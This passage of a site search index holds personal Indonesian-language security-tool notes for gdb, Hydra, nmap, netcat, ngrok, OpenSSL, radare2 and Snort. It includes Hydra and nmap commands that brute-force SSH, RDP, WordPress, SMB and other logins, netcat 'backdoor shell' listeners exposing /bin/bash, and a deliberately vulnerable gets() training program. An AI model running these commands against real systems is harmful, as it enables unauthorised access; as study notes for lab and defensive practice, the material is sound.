payload"},{"location":"tool/gdb/#input-in-running-gdb","text":"(gdb) r <<< $(python -c \"print '\\xde\\xad\\xbe\\xef'\") (gdb) r <<< $(python -c \"print 0xdeadbeef\") *masih kacau (not recommended)","title":"input in running gdb"},{"location":"tool/gdb/#cheat-sheet","text":"gdb set disassembly intel x main x win p main define hook-stop info register x/10i $eip-8 x/36wx $esp end","title":"Cheat sheet"},{"location":"tool/gdb/#objdump","text":"objdump -x <file> objdump -d <file> objdump -t <file>","title":"Objdump"},{"location":"tool/gns3/","text":"Install GNS3 Ubuntu 22.04 \u00b6 dari official website site sudo add-apt-repository ppa:gns3/ppa sudo apt update sudo apt install gns3-gui gns3-server Jika ingin IOU support \u00b6 sudo dpkg --add-architecture i386 sudo apt update sudo apt install gns3-iou Install Docker \u00b6 jika sudah menginstall, maka lewati tahap ini sudo apt remove docker docker-engine docker.io sudo apt-get install apt-transport-https ca-certificates curl software-properties-common curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" sudo apt update sudo apt install docker-ce Menambah grup \u00b6 ubridge libvirt kvm wireshark docker sudo usermod -aG ubridge $USER ... Run \u00b6 jika terdapat masalah ubridge , maka lakukan tahap selanjutnya Ubridge \u00b6 Hanya jika ubridge tidak stabil ref sudo su apt -y install libpcap-dev git cd /usr/local/src rm -Rf /usr/local/src/ubridge/ git clone git://github.com/GNS3/ubridge.git cd ubridge make make install cp -p ubridge /usr/bin setcap cap_net_admin,cap_net_raw=ep /usr//bin/ubridge Hasil \u00b6","title":"GNS3"},{"location":"tool/gns3/#install-gns3-ubuntu-2204","text":"dari official website site sudo add-apt-repository ppa:gns3/ppa sudo apt update sudo apt install gns3-gui gns3-server","title":"Install GNS3 Ubuntu 22.04"},{"location":"tool/gns3/#jika-ingin-iou-support","text":"sudo dpkg --add-architecture i386 sudo apt update sudo apt install gns3-iou","title":"Jika ingin IOU support"},{"location":"tool/gns3/#install-docker","text":"jika sudah menginstall, maka lewati tahap ini sudo apt remove docker docker-engine docker.io sudo apt-get install apt-transport-https ca-certificates curl software-properties-common curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\" sudo apt update sudo apt install docker-ce","title":"Install Docker"},{"location":"tool/gns3/#menambah-grup","text":"ubridge libvirt kvm wireshark docker sudo usermod -aG ubridge $USER ...","title":"Menambah grup"},{"location":"tool/gns3/#run","text":"jika terdapat masalah ubridge , maka lakukan tahap selanjutnya","title":"Run"},{"location":"tool/gns3/#ubridge","text":"Hanya jika ubridge tidak stabil ref sudo su apt -y install libpcap-dev git cd /usr/local/src rm -Rf /usr/local/src/ubridge/ git clone git://github.com/GNS3/ubridge.git cd ubridge make make install cp -p ubridge /usr/bin setcap cap_net_admin,cap_net_raw=ep /usr//bin/ubridge","title":"Ubridge"},{"location":"tool/gns3/#hasil","text":"","title":"Hasil"},{"location":"tool/hydra/","text":"Hydra \u00b6 https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/ SSH \u00b6 Bruteforce SSH credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh MySQL \u00b6 Bruteforce MySQL credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql FTP \u00b6 Bruteforce FTP credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp SMB \u00b6 Bruteforce SMB credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb HTTP Post Form \u00b6 Bruteforce web HTTP form hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"<Login Page>:<Request Body>:<Error Message>\" ex: hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/login.php:username=^USER^&password=^PASS^:Login Failed\" Wordpress \u00b6 Bruteforce WordPress credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' Windows RDP \u00b6 Bruteforce Windows Remote Desktop credentials hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP","title":"Hydra"},{"location":"tool/hydra/#hydra","text":"https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/","title":"Hydra"},{"location":"tool/hydra/#ssh","text":"Bruteforce SSH credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh","title":"SSH"},{"location":"tool/hydra/#mysql","text":"Bruteforce MySQL credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql","title":"MySQL"},{"location":"tool/hydra/#ftp","text":"Bruteforce FTP credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp","title":"FTP"},{"location":"tool/hydra/#smb","text":"Bruteforce SMB credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb","title":"SMB"},{"location":"tool/hydra/#http-post-form","text":"Bruteforce web HTTP form hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"<Login Page>:<Request Body>:<Error Message>\" ex: hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form \"/login.php:username=^USER^&password=^PASS^:Login Failed\"","title":"HTTP Post Form"},{"location":"tool/hydra/#wordpress","text":"Bruteforce WordPress credentials hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'","title":"Wordpress"},{"location":"tool/hydra/#windows-rdp","text":"Bruteforce Windows Remote Desktop credentials hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP","title":"Windows RDP"},{"location":"tool/ironbee/","text":"IronBee \u00b6 #WAF #Web Application Firewall Install \u00b6 Instalasi Aplikasi Pendukung sudo apt-get install autoconf automake1.11 build-essential geoip-database git graphviz libboost-all-dev libcurl4-openssl-dev libgeoip-dev libossp-uuid-dev libpcre3-dev libprotobuf-dev libtool libyajl-dev pkg-config protobuf-compiler ruby # Apache TrafficServer sudo apt-get install hwloc trafficserver-dev # Apache 2 (httpd) sudo apt-get install apache2-dev # Install the Ruby Protobuf gem sudo gem install ruby_protobuf Membuat IronBee # Get IronBee source git clone https://github.com/ironbee/ironbee.git cd ironbee ./autogen.sh cd .. # Setup a build directory mkdir ironbee-build cd ironbee-build # Configure and Build ../ironbee/configure --with-boost-suffix = --with- boost-thread_suffix = make make check sudo make install","title":"IronBee"},{"location":"tool/ironbee/#ironbee","text":"#WAF #Web Application Firewall","title":"IronBee"},{"location":"tool/ironbee/#install","text":"Instalasi Aplikasi Pendukung sudo apt-get install autoconf automake1.11 build-essential geoip-database git graphviz libboost-all-dev libcurl4-openssl-dev libgeoip-dev libossp-uuid-dev libpcre3-dev libprotobuf-dev libtool libyajl-dev pkg-config protobuf-compiler ruby # Apache TrafficServer sudo apt-get install hwloc trafficserver-dev # Apache 2 (httpd) sudo apt-get install apache2-dev # Install the Ruby Protobuf gem sudo gem install ruby_protobuf Membuat IronBee # Get IronBee source git clone https://github.com/ironbee/ironbee.git cd ironbee ./autogen.sh cd .. # Setup a build directory mkdir ironbee-build cd ironbee-build # Configure and Build ../ironbee/configure --with-boost-suffix = --with- boost-thread_suffix = make make check sudo make install","title":"Install"},{"location":"tool/maltego/","text":"Maltego \u00b6","title":"Maltego"},{"location":"tool/maltego/#maltego","text":"","title":"Maltego"},{"location":"tool/modsecurity/","text":"ModSecurity \u00b6","title":"ModSecurity"},{"location":"tool/modsecurity/#modsecurity","text":"","title":"ModSecurity"},{"location":"tool/netcat/","text":"Netcat \u00b6 nc adalah perintah yang menjalankan netcat. netcat adalah tool di Unix yang dapat membaca dan menuliskan data melalui jaringan, menggunakan protokol TCP atau UDP. netcat dirancang agar menjadi tool \"back-end\" yang dapat digunakan secara langsung atau di gunakan oleh program / script lain. Selain itu, netcat tool untuk debugging dan explorasi jaringan yang mempunyai banyak fitur, karena netcat mampu untuk membuat berbagai sambungan yang kita butuhkan dan mempunyai beberapa kemampuan built-in yang menarik. Penggunaan secara umum termasuk: TCP proxy sederhana. Shell-script based HTTP client dan server. Network daemon untuk percobaan. ProxyCommand Sock atau HTTP untuk SSH. nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] DESCRIPTION \u00b6 The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Common uses include: simple TCP proxies shell-script based HTTP clients and servers network daemon testing a SOCKS or HTTP ProxyCommand for ssh(1) and much, much more Contoh \u00b6 koneksi sederhana Server Client nc -l 12345 nc <ip_server> 12345 ketika connect pertama maka muncul text 'tesssss' Server\" Client echo \"tesssss\" | nc -l 12345 nc <ip_server> 12345 transferring from server to client Server Client echo \"ganteng\" > filename.txt nc -l 1499 > filename.txt nc <ip_server> 1499 < terima.txt Launching Reverse (Backdoor) Shells & run file Server Client nc -c /bin/bash -l -p 5555 nc <ip_server> 5555 run file Server Client nc -e file -lp 12345 nc <ip_server> 12345 Menggunakan socat Server Client socat STDIN tcp-listen:12345 nc <ip_server> 12345 # atau socat STDIN TCP4:<ip_server>:12345 Run .exe Server Client socat TCP-LISTEN:12345 EXEC:./file.exe # atau socat TCP-LISTEN:12345,reuseaddr,fork EXEC:./file.exe nc <ip_server> 12345","title":"Netcat"},{"location":"tool/netcat/#netcat","text":"nc adalah perintah yang menjalankan netcat. netcat adalah tool di Unix yang dapat membaca dan menuliskan data melalui jaringan, menggunakan protokol TCP atau UDP. netcat dirancang agar menjadi tool \"back-end\" yang dapat digunakan secara langsung atau di gunakan oleh program / script lain. Selain itu, netcat tool untuk debugging dan explorasi jaringan yang mempunyai banyak fitur, karena netcat mampu untuk membuat berbagai sambungan yang kita butuhkan dan mempunyai beberapa kemampuan built-in yang menarik. Penggunaan secara umum termasuk: TCP proxy sederhana. Shell-script based HTTP client dan server. Network daemon untuk percobaan. ProxyCommand Sock atau HTTP untuk SSH. nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]","title":"Netcat"},{"location":"tool/netcat/#description","text":"The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Common uses include: simple TCP proxies shell-script based HTTP clients and servers network daemon testing a SOCKS or HTTP ProxyCommand for ssh(1) and much, much more","title":"DESCRIPTION"},{"location":"tool/netcat/#contoh","text":"koneksi sederhana Server Client nc -l 12345 nc <ip_server> 12345 ketika connect pertama maka muncul text 'tesssss' Server\" Client echo \"tesssss\" | nc -l 12345 nc <ip_server> 12345 transferring from server to client Server Client echo \"ganteng\" > filename.txt nc -l 1499 > filename.txt nc <ip_server> 1499 < terima.txt Launching Reverse (Backdoor) Shells & run file Server Client nc -c /bin/bash -l -p 5555 nc <ip_server> 5555 run file Server Client nc -e file -lp 12345 nc <ip_server> 12345 Menggunakan socat Server Client socat STDIN tcp-listen:12345 nc <ip_server> 12345 # atau socat STDIN TCP4:<ip_server>:12345 Run .exe Server Client socat TCP-LISTEN:12345 EXEC:./file.exe # atau socat TCP-LISTEN:12345,reuseaddr,fork EXEC:./file.exe nc <ip_server> 12345","title":"Contoh"},{"location":"tool/ngrok/","text":"Ngrok \u00b6 sign in https://ngrok.com/ untuk mendapat token Install \u00b6 proses menggunakan ./ngrok sudo apt update sudo apt -y install snapd sudo snap install ngrok atau proses menggunakan /path/to/ngrok wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip /path/to/ngrok.zip Running \u00b6 /snap/bin/ngrok authtoken <your_auth_token> /snap/bin/ngrok help /snap/bin/ngrok http 80 /snap/bin/ngrok http 80 # secure public URL for port 80 web server /snap/bin/ngrok http -subdomain=baz 8080 # port 8080 available at baz.ngrok.io /snap/bin/ngrok http foo.dev:80 # tunnel to host:port instead of localhost /snap/bin/ngrok http https://localhost # expose a local https server /snap/bin/ngrok tcp 22 # tunnel arbitrary TCP traffic to port 22 /snap/bin/ngrok tls -hostname=foo.com 443 # TLS traffic for foo.com to port 443 /snap/bin/ngrok start foo bar baz # start tunnels from the configuration file","title":"ngrok"},{"location":"tool/ngrok/#ngrok","text":"sign in https://ngrok.com/ untuk mendapat token","title":"Ngrok"},{"location":"tool/ngrok/#install","text":"proses menggunakan ./ngrok sudo apt update sudo apt -y install snapd sudo snap install ngrok atau proses menggunakan /path/to/ngrok wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip /path/to/ngrok.zip","title":"Install"},{"location":"tool/ngrok/#running","text":"/snap/bin/ngrok authtoken <your_auth_token> /snap/bin/ngrok help /snap/bin/ngrok http 80 /snap/bin/ngrok http 80 # secure public URL for port 80 web server /snap/bin/ngrok http -subdomain=baz 8080 # port 8080 available at baz.ngrok.io /snap/bin/ngrok http foo.dev:80 # tunnel to host:port instead of localhost /snap/bin/ngrok http https://localhost # expose a local https server /snap/bin/ngrok tcp 22 # tunnel arbitrary TCP traffic to port 22 /snap/bin/ngrok tls -hostname=foo.com 443 # TLS traffic for foo.com to port 443 /snap/bin/ngrok start foo bar baz # start tunnels from the configuration file","title":"Running"},{"location":"tool/nmap/","text":"nmap \u00b6 referensi : https://lms.onnocenter.or.id/wiki/index.php/Nmap https://noxtal.com/cheatsheets/2020/07/13/nmap-cheatsheet/ Beberapa intruksi bagus : \u00b6 guide : nmap [Scan Type(s)] [Options] {target specification} scan ip : nmap $IP scan host : nmap hostname.com scan range IP : nmap 192.168.1.1-20 scan subnet nmap 192.168.1.0/24 port selection : (single) nmap -p 80 $IP port selection : (most commond) nmap -F $IP port selection : (range) nmap -p 1-100 $IP port selection : (all) nmap -p- $IP scaning mesin : nmap -v -sS -O 192.168.0.254 nmap \u2013sV \u2013O 192.168.12.120 nmap \u2013Pn --script vuln 192.168.12.120 -v untuk verbose supaya banyak keluar informasi -sS scanning port dengan mengirim paket SYNC -O dicoba juga untuk menebak sitem operasi yang digunakan very verbose : nmap -vv $IP bypass firewall : nmap -Pn $IP default scan : nmap -vv -sC -sV -oN nmap.log $IP complete scan : nmap -vv -A -p- -oN nmap-complete.log $IP vulnerability scan : nmap -vv --script vuln -oN nmap-vuln.log $IP http scan : nmap -vv --script http* -oN nmap-http.log $IP mysql scan : nmap -vv --script mysql* -oN nmap-mysql.log $IP ftp scan : nmap -vv --script ftp* -oN nmap-ftp.log $IP smb scan : nmap -vv --script smb* -oN nmap-smb.log $IP ssh scan : nmap -vv --script ssh* -oN nmap-ssh.log $IP ip address information : nmap --script=asn-query,whois,ip-geolocation-maxmind $IP passing brute force : nmap --script=ssh-brute --script-args userdb=usernames.lst,passwd=passwords.lst $IP brute force ftp password : nmap -p21 \u2013script ftp-brute.nse \u2013script-args userdb=rockyou.txt,passdb=rockyou.txt 192.168.1.105 brute force telnet password : nmap -p23 --script telnet-brute.nse --script-args userdb=rockyou.txt,passdb=rockyou.txt 192.168.1.105 brute force smb password : nmap --script smb-brute.nse -p445 192.168.0.7 nmap --script smb-brute.nse -p445 192.168.0.80 nmap -sU -sS --script smb-brute.nse -p U:137,T:139 192.168.0.80 nmap \u2013p445 \u2013script smb-brute.nse \u2013script-args userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.105 brute force mysql : *masih ada catatan nmap --script=mysql-brute <target> nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/root/user.txt --script-trace 192.168.0.100 nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/root/user.txt,passdb=/root/pass.txt --script-trace 192.168.0.100","title":"Nmap"},{"location":"tool/nmap/#nmap","text":"referensi : https://lms.onnocenter.or.id/wiki/index.php/Nmap https://noxtal.com/cheatsheets/2020/07/13/nmap-cheatsheet/","title":"nmap"},{"location":"tool/nmap/#beberapa-intruksi-bagus","text":"guide : nmap [Scan Type(s)] [Options] {target specification} scan ip : nmap $IP scan host : nmap hostname.com scan range IP : nmap 192.168.1.1-20 scan subnet nmap 192.168.1.0/24 port selection : (single) nmap -p 80 $IP port selection : (most commond) nmap -F $IP port selection : (range) nmap -p 1-100 $IP port selection : (all) nmap -p- $IP scaning mesin : nmap -v -sS -O 192.168.0.254 nmap \u2013sV \u2013O 192.168.12.120 nmap \u2013Pn --script vuln 192.168.12.120 -v untuk verbose supaya banyak keluar informasi -sS scanning port dengan mengirim paket SYNC -O dicoba juga untuk menebak sitem operasi yang digunakan very verbose : nmap -vv $IP bypass firewall : nmap -Pn $IP default scan : nmap -vv -sC -sV -oN nmap.log $IP complete scan : nmap -vv -A -p- -oN nmap-complete.log $IP vulnerability scan : nmap -vv --script vuln -oN nmap-vuln.log $IP http scan : nmap -vv --script http* -oN nmap-http.log $IP mysql scan : nmap -vv --script mysql* -oN nmap-mysql.log $IP ftp scan : nmap -vv --script ftp* -oN nmap-ftp.log $IP smb scan : nmap -vv --script smb* -oN nmap-smb.log $IP ssh scan : nmap -vv --script ssh* -oN nmap-ssh.log $IP ip address information : nmap --script=asn-query,whois,ip-geolocation-maxmind $IP passing brute force : nmap --script=ssh-brute --script-args userdb=usernames.lst,passwd=passwords.lst $IP brute force ftp password : nmap -p21 \u2013script ftp-brute.nse \u2013script-args userdb=rockyou.txt,passdb=rockyou.txt 192.168.1.105 brute force telnet password : nmap -p23 --script telnet-brute.nse --script-args userdb=rockyou.txt,passdb=rockyou.txt 192.168.1.105 brute force smb password : nmap --script smb-brute.nse -p445 192.168.0.7 nmap --script smb-brute.nse -p445 192.168.0.80 nmap -sU -sS --script smb-brute.nse -p U:137,T:139 192.168.0.80 nmap \u2013p445 \u2013script smb-brute.nse \u2013script-args userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.105 brute force mysql : *masih ada catatan nmap --script=mysql-brute <target> nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/root/user.txt --script-trace 192.168.0.100 nmap -sT -p3306 --script mysql-brute.nse --script-args userdb=/root/user.txt,passdb=/root/pass.txt --script-trace 192.168.0.100","title":"Beberapa intruksi bagus :"},{"location":"tool/openssl/","text":"OpenSSL \u00b6 sumber bacaan : https://github.com/openssl/openssl git clone git://git.openssl.org/openssl.git openssl version openssl version -a openssl file \u00b6 enc : openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc dec : openssl aes-256-cbc -d -a -in secrets.txt.enc -out secrets.txt.new or echo U2FsdGVkX18YcWkbmhsN7M/MP1E+GLf4IqmNsa53T+A= | openssl aes-256-cbc -d -a echo U2FsdGVkX18YcWkbmhsN7M/MP1E+GLf4IqmNsa53T+A= | openssl aes-256-cbc -d -a -pass pass:<pass> masih ambyuradyul","title":"OpenSSL"},{"location":"tool/openssl/#openssl","text":"sumber bacaan : https://github.com/openssl/openssl git clone git://git.openssl.org/openssl.git openssl version openssl version -a","title":"OpenSSL"},{"location":"tool/openssl/#openssl-file","text":"enc : openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc dec : openssl aes-256-cbc -d -a -in secrets.txt.enc -out secrets.txt.new or echo U2FsdGVkX18YcWkbmhsN7M/MP1E+GLf4IqmNsa53T+A= | openssl aes-256-cbc -d -a echo U2FsdGVkX18YcWkbmhsN7M/MP1E+GLf4IqmNsa53T+A= | openssl aes-256-cbc -d -a -pass pass:<pass> masih ambyuradyul","title":"openssl file"},{"location":"tool/owasp/","text":"OWASP \u00b6","title":"OWASP"},{"location":"tool/owasp/#owasp","text":"","title":"OWASP"},{"location":"tool/radare2/","text":"radare2 \u00b6 install git clone https://github.com/radare/radare2.git cd radare2/ ./sys/install.sh menjalankan program r2 (elf) r2 -d (elf) radare2 (elf) beberapa instruksi : analisis blablabla : aaa seek to main : s sys.main print disassambly : pdf break : db break_point run/continue : dc visual : VV step into : s next into : caps + s info register : dr mengubah nilai : (misal ke memori 0x000) dr rip=0x000 rename var-name : afvn prev_name name Praktik \u00b6 source code didapat dari https://exploit.education/protostar/ ada banyak contoh, tinggal copas Stack Zero #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; modified = 0 ; gets ( buffer ); if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } gcc stack-zero.c -o stack-zero radare2 ./stack-zero Dibawah ini adalah cheat sheet, dibilang urut jg tidak, tp dibilang berantakan jg tidak V V V q p p P p P `shift+:` analyse : aaa afl afll seek to the main func : s main `enter` u ? xref axt -> where is it being called axf ax? enter : step into u : undo ii iE iS is iz -> string izz ... menarik \u00b6 https://radare.gitbooks.io/radare2book/content/ user interface mode : r2 -c=H <file_elf>","title":"Radare2"},{"location":"tool/radare2/#radare2","text":"install git clone https://github.com/radare/radare2.git cd radare2/ ./sys/install.sh menjalankan program r2 (elf) r2 -d (elf) radare2 (elf) beberapa instruksi : analisis blablabla : aaa seek to main : s sys.main print disassambly : pdf break : db break_point run/continue : dc visual : VV step into : s next into : caps + s info register : dr mengubah nilai : (misal ke memori 0x000) dr rip=0x000 rename var-name : afvn prev_name name","title":"radare2"},{"location":"tool/radare2/#praktik","text":"source code didapat dari https://exploit.education/protostar/ ada banyak contoh, tinggal copas Stack Zero #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; modified = 0 ; gets ( buffer ); if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } gcc stack-zero.c -o stack-zero radare2 ./stack-zero Dibawah ini adalah cheat sheet, dibilang urut jg tidak, tp dibilang berantakan jg tidak V V V q p p P p P `shift+:` analyse : aaa afl afll seek to the main func : s main `enter` u ? xref axt -> where is it being called axf ax? enter : step into u : undo ii iE iS is iz -> string izz ...","title":"Praktik"},{"location":"tool/radare2/#menarik","text":"https://radare.gitbooks.io/radare2book/content/ user interface mode : r2 -c=H <file_elf>","title":"menarik"},{"location":"tool/snort/","text":"Snort \u00b6 from tryhackme.com and manual snort Kemampuan Snort \u00b6 Live traffic analysis Attack and probe detection Packet logging Protocol analysis Real-time alerting Modules & plugins Pre-processors Cross-platform support! (Linux & Windows) Tiga model penggunaan utama \u00b6 Mode Sniffer - Membaca paket IP dan memintanya di aplikasi konsol. Packet Logger Mode - Catat semua paket IP (masuk dan keluar) yang mengunjungi jaringan. Mode NIDS (Network Intrusion Detection System) dan NIPS (Network Intrusion Prevention System) - Log/drop paket yang dianggap berbahaya menurut aturan yang ditentukan pengguna. Basic Syntax \u00b6 snort -V ,,_ -*> Snort! <*- o\" )~ Version 2.9.15.1 GRE (Build 15125) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014-2019 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.10.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 USAGE: snort [-options] <filter options> Options: -A Set alert mode: fast, full, console, test or none (alert file alerts only) \"unsock\" enables UNIX socket logging (experimental). -b Log packets in tcpdump format (much faster!) -B <mask> Obfuscated IP addresses in alerts and packet dumps using CIDR mask -c <rules> Use Rules File <rules> -C Print out payloads with character data only (no hex) -d Dump the Application Layer -D Run Snort in background (daemon) mode -e Display the second layer header info -f Turn off fflush() calls after binary log writes -F <bpf> Read BPF filters from file <bpf> -g <gname> Run snort gid as <gname> group (or gid) after initialization -G <0xid> Log Identifier (to uniquely id events for multiple snorts) -h <hn> Set home network = <hn> (for use with -l or -B, does NOT change $HOME_NET in IDS mode) -H Make hash tables deterministic. -i <if> Listen on interface <if> -I Add Interface name to alert output -k <mode> Checksum mode (all,noip,notcp,noudp,noicmp,none) -K <mode> Logging mode (pcap[default],ascii,none) -l <ld> Log to directory <ld> -L <file> Log to this tcpdump file -M Log messages to syslog (not alerts) -m <umask> Set umask = <umask> -n <cnt> Exit after receiving <cnt> packets -N Turn off logging (alerts still work) -O Obfuscate the logged IP addresses -p Disable promiscuous mode sniffing -P <snap> Set explicit snaplen of packet (default: 1514) -q Quiet. Don't show banner and status report -Q Enable inline mode operation. -r <tf> Read and process tcpdump file <tf> -R <id> Include 'id' in snort_intf<id>.pid file name -s Log alert messages to syslog -S <n=v> Set rules file variable n equal to value v -t <dir> Chroots process to <dir> after initialization -T Test and report on the current Snort configuration -u <uname> Run snort uid as <uname> user (or uid) after initialization -U Use UTC for timestamps -v Be verbose -V Show version number -X Dump the raw packet data starting at the link layer -x Exit if Snort configuration problems occur -y Include year in timestamp in the alert and log files -Z <file> Set the performonitor preprocessor file path and name -? Show this information <Filter Options> are standard BPF options, as seen in TCPDump Longname options and their corresponding single char version --logid <0xid> Same as -G --perfmon-file <file> Same as -Z --pid-path <dir> Specify the directory for the Snort PID file --snaplen <snap> Same as -P --help Same as -? --version Same as -V --alert-before-pass Process alert, drop, sdrop, or reject before pass, default is pass before alert, drop,... --treat-drop-as-alert Converts drop, sdrop, and reject rules into alert rules during startup --treat-drop-as-ignore Use drop, sdrop, and reject rules to ignore session traffic when not inline. --process-all-events Process all queued events (drop, alert,...), default stops after 1st action group --enable-inline-test Enable Inline-Test Mode Operation --dynamic-engine-lib <file> Load a dynamic detection engine --dynamic-engine-lib-dir <path> Load all dynamic engines from directory --dynamic-detection-lib <file> Load a dynamic rules library --dynamic-detection-lib-dir <path> Load all dynamic rules libraries from directory --dump-dynamic-rules <path> Creates stub rule files of all loaded rules libraries --dynamic-preprocessor-lib <file> Load a dynamic preprocessor library --dynamic-preprocessor-lib-dir <path> Load all dynamic preprocessor libraries from directory --dynamic-output-lib <file> Load a dynamic output library --dynamic-output-lib-dir <path> Load all dynamic output libraries from directory --create-pidfile Create PID file, even when not in Daemon mode --nolock-pidfile Do not try to lock Snort PID file --no-interface-pidfile Do not include the interface name in Snort PID file --disable-attribute-reload-thread Do not create a thread to reload the attribute table --pcap-single <tf> Same as -r. --pcap-file <file> file that contains a list of pcaps to read - read mode is implied. --pcap-list \"<list>\" a space separated list of pcaps to read - read mode is implied. --pcap-dir <dir> a directory to recurse to look for pcaps - read mode is implied. --pcap-filter <filter> filter to apply when getting pcaps from file or directory. --pcap-no-filter reset to use no filter when getting pcaps from file or directory. --pcap-loop <count> this option will read the pcaps specified on command line continuously. for <count> times. A value of 0 will read until Snort is terminated. --pcap-reset if reading multiple pcaps, reset snort to post-configuration state before reading next pcap. --pcap-reload if reading multiple pcaps, reload snort config between pcaps. --pcap-show print a line saying what pcap is currently being read. --exit-check <count> Signal termination after <count> callbacks from DAQ_Acquire(), showing the time it takes from signaling until DAQ_Stop() is called. --conf-error-out Same as -x --enable-mpls-multicast Allow multicast MPLS --enable-mpls-overlapping-ip Handle overlapping IPs within MPLS clouds --max-mpls-labelchain-len Specify the max MPLS label chain --mpls-payload-type Specify the protocol (ipv4, ipv6, ethernet) that is encapsulated by MPLS --require-rule-sid Require that all snort rules have SID specified. --daq <type> Select packet acquisition module (default is pcap). --daq-mode <mode> Select the DAQ operating mode. --daq-var <name=value> Specify extra DAQ configuration variable. --daq-dir <dir> Tell snort where to find desired DAQ. --daq-list[=<dir>] List packet acquisition modules available in dir. Default is static modules only. --dirty-pig Don't flush packets and release memory on shutdown. --cs-dir <dir> Directory to use for control socket. --ha-peer Activate live high-availability state sharing with peer. --ha-out <file> Write high-availability events to this file. --ha-in <file> Read high-availability events from this file on startup (warm-start). --suppress-config-log Suppress configuration information output. Sniffer Mode \u00b6 sudo snort -c /etc/snort/snort.conf -T daemon mode sudo snort -c /etc/snort/snort.conf -D $ ps -ef | grep snort root 2898 1706 0 05:53 ? 00:00:00 snort -c /etc/snort/snort.conf -D $ sudo kill -9 2898 menampilkan header paket TCP/IP sudo snort -v menampilkan header paket IP dan TCP/UDP/ICMP pada interface tertentu sudo snort -v -i eth0 menampilkan paket data/payload sudo snort -d jika ingin menampilkan juga data link layer headers sudo snort -d -e menampilkan full detail paket dalam HEX sudo snort -X Packet Logger Mode \u00b6 snort -dev -l . snort -dev -K ASCII -l . read binary log snort -r snort.log.1658551733 read menggunakan tcpdump tcpdump -r snort.log.1658551733 -ntc 10 membaca log dan filter sudo snort -r logname.log -X sudo snort -r logname.log icmp sudo snort -r logname.log tcp sudo snort -r logname.log 'udp and port 53' membaca 10 packet awal snort -dvr logname.log -n 10 IDS/IPS \u00b6 terdapat beberapa alert dalam snort console: menampilkan \" fast style \" alerts. cmg: menampilkan detail basic header dalam payload format hex dan text. full: Full alert mode , menampilkan semua informasi yang mungkin tentang alert . fast: mode fast alert . menampilkan alert dalam format sederhana. timestamp, alert message, source dan destination IPs/ports. none: Disabling alerting. sudo snort -c /etc/snort/snort.conf -A console sudo snort -c /etc/snort/snort.conf -A cmg sudo snort -c /etc/snort/snort.conf -A fast 